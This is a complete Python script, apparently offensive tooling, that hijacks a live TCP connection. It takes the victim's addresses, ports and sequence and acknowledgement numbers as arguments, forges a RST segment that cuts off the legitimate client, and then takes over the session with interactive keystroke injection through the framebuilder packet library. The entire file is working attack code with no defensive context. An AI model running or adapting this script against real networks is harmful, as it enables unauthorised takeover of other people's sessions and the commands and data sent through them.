#!/usr/bin/env python3

'''Script for TCP hijacking'''

import sys, tty, termios, select
from framebuilder import eth, ipv4, tcp, tools, errors

def key_pressed():
    return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])

def print_err(msg):
    arg_str = 'interface local_ip local_port remote_ip remote_port seq_nr ack_nr'
    print('Error:', msg)
    print(f'Usage: {sys.argv[0]} {arg_str}')

def check_args():
    if len(sys.argv) < 8:
        print_err('Missing arguments')
        sys.exit(1)
    if not tools.is_valid_ipv4_address(sys.argv[2]):
        print_err(f'Invalid IP address: {sys.argv[2]}')
        sys.exit(1)
    if not tools.is_valid_ipv4_address(sys.argv[4]):
        print_err(f'Invalid IP address: {sys.argv[4]}')
        sys.exit(1)
    try:
        _ = int(sys.argv[3])
        _ = int(sys.argv[5])
        _ = int(sys.argv[6])
        _ = int(sys.argv[7])
    except ValueError:
        print_err('Invalid port, ack or sequence number')

# validate parameters and initialize variables
check_args()
if_name = sys.argv[1]
client_ip = sys.argv[2]
server_ip = sys.argv[4]
client_port = int(sys.argv[3])
server_port = int(sys.argv[5])
seq_nr = int(sys.argv[6])
ack_nr = int(sys.argv[7])

# cut off the original connection
ip_handler = ipv4.IPv4Handler(if_name, client_ip, server_ip)
rst_seg = tcp.TCPSegment()
rst_seg.src_port = server_port
rst_seg.dst_port = client_port
rst_seg.seq_nr = ack_nr
rst_seg.ack_nr = seq_nr
rst_seg.window = 1460
rst_seg.rst = 1
rst_seg.ack = 1
ip_handler.send(rst_seg)

# prepare TCP parameters and handler
tcp_handler = tcp.TCPHandler(if_name, client_port, server_ip)
tcp_handler.remote_port = server_port
tcp_handler.local_ip = client_ip
tcp_handler._rcv_nxt = ack_nr
tcp_handler._snd_nxt = seq_nr
tcp_handler._snd_una = seq_nr
tcp_handler._snd_wnd = 65535
tcp_handler._rem_rwnd = 65535
tcp_handler.state = tcp.TCPHandler.ESTABLISHED
ch = chr(0)

# configure terminal an start
term_attr = termios.tcgetattr(sys.stdin)
try:
    tty.setcbreak(sys.stdin.fileno())
    new_tty_attr = termios.tcgetattr(sys.stdin)
    new_tty_attr[3] |= termios.ECHO
    termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
    while ord(ch) != 4: # 4 => ^D
        if key_pressed():
            ch = sys.stdin.read(1)
            if ord(ch) != 4: tcp_handler.send(ch.encode())
        data = tcp_handler.receive(65535)
        print(data.decode(), end='')
finally:
    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
    print('\nQUIT')
    tcp_handler.close()
